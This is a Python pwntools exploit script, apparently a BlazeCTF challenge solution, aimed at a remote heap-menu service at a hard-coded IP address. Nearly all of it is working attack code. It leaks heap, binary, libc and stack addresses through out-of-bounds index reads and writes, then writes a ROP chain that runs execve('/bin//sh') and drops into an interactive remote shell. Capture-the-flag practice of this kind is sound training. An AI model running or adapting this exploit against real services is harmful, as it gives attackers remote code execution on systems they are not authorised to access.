#blaze{Congratulations, you've unlocked your first BlazeCTF recipe, DANK GARLICBREAD, the recipes button above the scoreboard should now be unlocked}
#md5 of target glibc = 252a9cb1b33b0d1d89a7ce8744e1cb17
#rops can be found from http://ropshell.com/static/txt/252a9cb1b33b0d1d89a7ce8744e1cb17.txt.gz

from pwn import *

debug = True
my_server = False

###################
if my_server:
  r = remote(ip_of_my_server, 10101)
  r.sendline("run") # starting gdb
else:
  r = remote('107.170.17.158', 4201)

if debug:
  context.log_level = 'debug'
###################

context(arch = 'amd64', os = 'linux')

###################


r.recvuntil("\n> ")
r.sendline("1") #write
r.recvuntil(": ")
r.sendline("0") #cubby
r.recvuntil(": ")
r.sendline("256") #size
r.recvuntil(": ")
r.sendline("."*4) #data

r.recvuntil("\n> ")
r.sendline("1") #write
r.recvuntil(": ")
r.sendline("34") #cubby
r.recvuntil(": ")
r.sendline("16") #size
r.recvuntil(": ")
r.sendline("."*4) #data

r.recvuntil("\n> ")
r.sendline("2") #read
r.recvuntil(": ")
r.sendline("0") #cubby
data = r.recvuntil("\n1 ->")[:-5]
data += "\x00" * (8 - len(data))
ptr1 = u64(data)
print "1--->",hex(ptr1)
ptrHeap = ptr1-68*8
print "h--->",hex(ptrHeap)

r.recvuntil("\n> ")
r.sendline("1") #write
r.recvuntil(": ")
r.sendline(str(72%64)) #cubby
r.recvuntil(": ")
r.sendline("16") #size
r.recvuntil(": ")
r.sendline(p64(ptrHeap)) #data

r.recvuntil("\n> ")
r.sendline("1") #write
r.recvuntil(": ")
r.sendline(str(76%64)) #cubby
r.recvuntil(": ")
r.sendline("16") #size
r.recvuntil(": ")
r.sendline(p64(ptrHeap)) #data

r.recvuntil("\n> ")
r.sendline("3") #delete
r.recvuntil(": ")
r.sendline("72") #cubby

r.recvuntil("\n> ")
r.sendline("2") #read
r.recvuntil(": ")
r.sendline("76") #cubby
data = r.recvuntil("\n1 ->")[:-5]
data += "\x00" * (8 - len(data))
ptr2 = u64(data)
print "2--->",hex(ptr2) 
ptrMain = ptr2 + int('22c722', 16)
print "m--->",hex(ptrMain) 
ptr2_ = ptr2 - int('790', 16)

r.sendline("1") #write
r.recvuntil(": ")
r.sendline("4") #cubby
r.recvuntil(": ")
r.sendline("16") #size
r.recvuntil(": ")
r.sendline(p64(ptr2_)) #data

r.recvuntil("\n> ")
r.sendline("2") #read
r.recvuntil(": ")
r.sendline("0") #cubby
data = r.recvuntil("\n1 ->")[:-5]
data += "\x00" * (8 - len(data))
ptr2__ = u64(data)
ptrLibc_ = ptr2__ - int('1f406', 16)
print "l--->",hex(ptrLibc_)
ptrLibc = ptrLibc_ + 0x1f4a0 # code section
print "lc-->",hex(ptrLibc) 

r.recvuntil("\n> ")
r.sendline("3") #delete
r.recvuntil(": ")
r.sendline("4") #cubby

r.sendline("1") #write
r.recvuntil(": ")
r.sendline("4") #cubby
r.recvuntil(": ")
r.sendline("16") #size
r.recvuntil(": ")
r.sendline(p64(ptr2 - int("e8",16))) #data

r.recvuntil("\n> ")
r.sendline("2") #read
r.recvuntil(": ")
r.sendline("0") #cubby
data = r.recvuntil("\n1 ->")[:-5]
data += "\x00" * (8 - len(data))
ptr3 = u64(data)
print "3--->",hex(ptr3)


r.recvuntil("\n> ")
r.sendline("3") #delete
r.recvuntil(": ")
r.sendline("4") #cubby

r.sendline("1") #write
r.recvuntil(": ")
r.sendline("4") #cubby
r.recvuntil(": ")
r.sendline("16") #size
r.recvuntil(": ")
r.sendline(p64(ptr3 + int("1200",16))) #data

r.recvuntil("\n> ")
r.sendline("2") #read
r.recvuntil(": ")
r.sendline("0") #cubby
data = r.recvuntil("\n1 ->")[:-5]
data += "\x00" * (8 - len(data))
ptrStack = u64(data)
print "4--->",hex(ptrStack)
print ptrStack % 8


# ptrStack - 20h*8 --> 1
# ptrStack - 21h*8 --> xxx
# ptrStack - 22h*8 --> return
#...
# ptrStack - 27h*8 --> rbp

############################################################
attackPtr = ptrStack - int("27",16) * 8
diff = attackPtr - ptrHeap
cubby = diff / 8
print "cubby-->",cubby

##########################################

r.recvuntil("\n> ")
r.sendline("3") #delete
r.recvuntil(": ")
r.sendline("4") #cubby

r.sendline("1") #write
r.recvuntil(": ")
r.sendline(str(cubby)) #cubby
r.recvuntil(": ")
r.sendline("256") #size
r.recvuntil(": ")

from struct import pack
# Padding goes here
p = '.' * 8
p += pack('<Q', ptrLibc + 0x306) # pop rdi ; pop rbp; ret OK
p += pack('<Q', ptrMain - 0xeda + 0x202000) # @ .data
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', ptrLibc + 0x29668) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', ptrLibc + 0x73749) # mov qword ptr [rdi], rax ; pop rbx ; pop rbp ; ret
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', ptrLibc + 0x306) # pop rdi ; pop rbp; ret OK
p += pack('<Q', ptrMain - 0xeda + 0x202008) # @ .data + 8
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', ptrLibc + 0x6a625) # xor rax, rax ; ret
p += pack('<Q', ptrLibc + 0x73749) # mov qword ptr [rdi], rax ; pop rbx ; pop rbp ; ret
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', ptrLibc + 0x306) # pop rdi ; pop rbp; ret OK
p += pack('<Q', ptrMain - 0xeda + 0x202000) # @ .data
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', ptrLibc + 0x5255) # pop rsi ; ret
p += pack('<Q', ptrMain - 0xeda + 0x202008) # @ .data + 8
p += pack('<Q', ptrLibc + 0x9e880) # pop rdx ; ret
p += pack('<Q', ptrMain - 0xeda + 0x202008) # @ .data + 8
p += pack('<Q', ptrLibc + 0x29668) # pop rax ; ret
p += pack('<Q', 59)
p += pack('<Q', ptrLibc + 0xa37f5) # syscall ; ret

#r.sendline("." * 8 + p64(ptrMain)) #data
r.sendline(p) #data


r.interactive()
